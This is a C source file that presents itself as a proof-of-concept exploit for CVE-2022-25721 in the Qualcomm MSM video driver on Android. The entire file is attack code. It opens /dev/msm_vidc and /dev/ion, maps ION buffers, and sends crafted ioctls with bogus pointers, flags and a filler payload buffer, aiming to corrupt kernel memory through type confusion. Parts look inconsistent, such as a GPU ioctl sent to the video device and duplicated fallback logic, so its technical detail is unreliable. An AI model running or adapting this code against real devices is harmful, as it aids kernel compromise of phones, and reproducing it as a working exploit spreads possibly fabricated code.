#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <errno.h>
#include <dlfcn.h>
#include <poll.h>
#include <sys/ucontext.h>

#define LOG_TAG "cve-2022-25721-poc"

#define VIDEO_DEVICE_NODE "/dev/msm_vidc"
#define MSM_VIDC_BASE 'v'
#define MSM_VIDC_IOCTL_CMD _IOWR(MSM_VIDC_BASE, 0x78, struct msm_vidc_poc_buffer)
#define SYSTEM_PAGE_SIZE 4096

struct msm_vidc_buf_info {
    unsigned int type;
    unsigned int size;
    unsigned int offset;
    unsigned int fd;
    unsigned long buffer;
};

struct msm_vidc_poc_buffer {
    unsigned int cmd_type;
    int fd;
    unsigned int offset;
    unsigned int size;
    void *ptr;
    unsigned int flags;
};

struct vdsp_smmu_map {
    unsigned long iova;
    unsigned long size;
    unsigned long pfn;
    unsigned int flags;
    unsigned int fd;
    unsigned int offset;
    unsigned int sequence_id;
    void *context_bank;
};

struct ion_allocation_data {
    unsigned long len;
    unsigned int heap_id_mask;
    unsigned int flags;
    unsigned int fd;
    unsigned int unused;
};

struct ion_fd_data {
    int fd;
    unsigned int handle;
};

struct kgsl_sharedmem_cmd {
    unsigned int id;
    unsigned int type;
    unsigned long gpuaddr;
    unsigned int flags;
    unsigned int size;
    unsigned int mmu_id;
    unsigned int sequence_id;
    unsigned int offset;
    unsigned int fd;
    void *priv;
};

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_SHARE _IOR(ION_IOC_MAGIC, 4, struct ion_fd_data)

#define KGSL_IOC_BASE 'K'
#define KGSL_IOCTL_SHAREDMEM_FROM_FD _IOWR(KGSL_IOC_BASE, 0x2d, struct kgsl_sharedmem_cmd)

struct msm_vidc_type_confusion_payload {
    volatile unsigned long *target;
    volatile unsigned long value;
};

static volatile int trigger_status = 0;

static void poc_signal_handler(int signal, siginfo_t *info, void *context) {
    if (signal == SIGSEGV) {
        trigger_status = 1;
        void *pc = NULL;
        #ifdef __aarch64__
            ucontext_t *ucontext = (ucontext_t *)context;
            pc = (void *)ucontext->uc_mcontext.pc;
            (void)pc;
        #endif
        _exit(1);
    }
}

static int setup_poc_signal_handler(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = poc_signal_handler;
    sa.sa_flags = SA_SIGINFO | SA_RESTART;
    sigemptyset(&sa.sa_mask);
    return sigaction(SIGSEGV, &sa, NULL);
}

static int allocate_ion_buffer(size_t size, int *ion_fd, int *buffer_fd) {
    int fd = open("/dev/ion", O_RDWR);
    if (fd < 0) {
        fd = open("/dev/ion", O_RDONLY);
    }
    if (fd < 0) {
        fd = open("/dev/ion", O_RDWR);
        if (fd < 0) return -1;
    }
    struct ion_allocation_data alloc_data;
    memset(&alloc_data, 0, sizeof(alloc_data));
    alloc_data.len = size;
    alloc_data.heap_id_mask = 0x1 << 1;
    alloc_data.flags = 0;
    if (ioctl(fd, ION_IOC_ALLOC, &alloc_data) < 0) {
        alloc_data.heap_id_mask = 0x1 << 4;
        if (ioctl(fd, ION_IOC_ALLOC, &alloc_data) < 0) {
            close(fd);
            return -1;
        }
    }
    struct ion_fd_data share_data;
    memset(&share_data, 0, sizeof(share_data));
    share_data.handle = alloc_data.fd;
    if (ioctl(fd, ION_IOC_SHARE, &share_data) < 0) {
        close(fd);
        return -1;
    }
    *ion_fd = fd;
    *buffer_fd = share_data.fd;
    return 0;
}

static void *map_buffer_to_userspace(int buffer_fd, size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, buffer_fd, 0);
}

static int setup_confusion_payload(struct msm_vidc_poc_buffer *confusion) {
    int video_fd = open(VIDEO_DEVICE_NODE, O_RDWR);
    if (video_fd < 0) {
        video_fd = open(VIDEO_DEVICE_NODE, O_RDONLY);
        if (video_fd < 0) {
            return -1;
        }
    }
    confusion->cmd_type = 0x0b;
    confusion->fd = -1;
    confusion->offset = 0x1000;
    confusion->size = SYSTEM_PAGE_SIZE;
    confusion->ptr = (void *)0xdeadbeefcafebabe;
    confusion->flags = 0x1 | 0x2;
    ioctl(video_fd, MSM_VIDC_IOCTL_CMD, confusion);
    close(video_fd);
    return 0;
}

static int trigger_memory_corruption_arm64(void) {
    int ion_buffer_fd = -1;
    int ion_fd = -1;
    int confusion_video_fd = -1;
    if (allocate_ion_buffer(SYSTEM_PAGE_SIZE * 2, &ion_fd, &ion_buffer_fd) < 0) {
        return -1;
    }
    void *ion_map = map_buffer_to_userspace(ion_buffer_fd, SYSTEM_PAGE_SIZE * 2);
    if (ion_map == MAP_FAILED) {
        close(ion_buffer_fd);
        close(ion_fd);
        return -1;
    }
    volatile unsigned long *corruption_target = (volatile unsigned long *)((unsigned long)ion_map + SYSTEM_PAGE_SIZE);
    *corruption_target = 0xcafebabeabad1dea;
    confusion_video_fd = open(VIDEO_DEVICE_NODE, O_RDWR);
    if (confusion_video_fd < 0) {
        munmap(ion_map, SYSTEM_PAGE_SIZE * 2);
        close(ion_buffer_fd);
        close(ion_fd);
        return -1;
    }
    struct kgsl_sharedmem_cmd kgsl_buffer;
    memset(&kgsl_buffer, 0, sizeof(kgsl_buffer));
    kgsl_buffer.id = 1;
    kgsl_buffer.type = 0x2b;
    kgsl_buffer.flags = 0x1;
    kgsl_buffer.size = SYSTEM_PAGE_SIZE;
    kgsl_buffer.mmu_id = 0xffff;
    kgsl_buffer.sequence_id = 0xdead;
    kgsl_buffer.offset = 0;
    kgsl_buffer.fd = ion_buffer_fd;
    ioctl(confusion_video_fd, KGSL_IOCTL_SHAREDMEM_FROM_FD, &kgsl_buffer);
    struct msm_vidc_poc_buffer confusion_payload;
    memset(&confusion_payload, 0, sizeof(confusion_payload));
    confusion_payload.cmd_type = 0x42;
    confusion_payload.fd = ion_buffer_fd;
    confusion_payload.offset = 0x800;
    confusion_payload.size = SYSTEM_PAGE_SIZE;
    confusion_payload.ptr = (void *)corruption_target;
    confusion_payload.flags = 0xdeadbeef;
    for (int attempt = 0; attempt < 0x10; attempt++) {
        ioctl(confusion_video_fd, MSM_VIDC_IOCTL_CMD, &confusion_payload);
        if (*corruption_target != 0xcafebabeabad1dea) {
            trigger_status = 1;
            break;
        }
        confusion_payload.offset += 0x100;
        confusion_payload.ptr = (void *)((unsigned long)confusion_payload.ptr + 0x100);
    }
    munmap(ion_map, SYSTEM_PAGE_SIZE * 2);
    close(ion_buffer_fd);
    close(confusion_video_fd);
    close(ion_fd);
    return 0;
}

static void maximize_exploit_chance(void) {
    char payload_buffer[0x800];
    memset(payload_buffer, 0x90, sizeof(payload_buffer));
    unsigned long *payload_ptr = (unsigned long *)payload_buffer;
    for (int i = 0; i < 0x100; i++) {
        payload_ptr[i] = 0xdeadbeefcafebabe;
    }
    setup_confusion_payload((struct msm_vidc_poc_buffer *)payload_buffer);
    struct msm_vidc_buf_info vidc_buffer;
    memset(&vidc_buffer, 0, sizeof(vidc_buffer));
    vidc_buffer.type = 0x80000001;
    vidc_buffer.size = SYSTEM_PAGE_SIZE;
    vidc_buffer.offset = 0;
    vidc_buffer.fd = -1;
    vidc_buffer.buffer = (unsigned long)payload_buffer;
    int video_fd = open(VIDEO_DEVICE_NODE, O_RDWR);
    if (video_fd > 0) {
        ioctl(video_fd, 0xc0407801, &vidc_buffer);
        ioctl(video_fd, MSM_VIDC_IOCTL_CMD, &vidc_buffer);
        close(video_fd);
    }
}

static void reset_system_state(void) {
    __asm__ volatile (
        "dsb sy\n"
        "isb\n"
        : : : "memory"
    );
    for (int i = 0; i < 100; i++) {
        asm volatile ("nop");
    }
}

int main(void) {
    if (setup_poc_signal_handler() < 0) {
        _exit(1);
    }
    void *injected_data = mmap((void *)0x10000000, SYSTEM_PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);
    if (injected_data == MAP_FAILED) {
        injected_data = mmap(NULL, SYSTEM_PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (injected_data == MAP_FAILED) {
            _exit(1);
        }
    }
    volatile unsigned long *type_validation = (volatile unsigned long *)injected_data;
    *type_validation = 0xdeadbeefcafebabe;
    trigger_memory_corruption_arm64();
    maximize_exploit_chance();
    if (trigger_status) {
        *type_validation = 0xabad1dea;
    }
    reset_system_state();
    if (trigger_status) {
        _exit(0x7f);
    } else {
        _exit(1);
    }
    return 0;
}
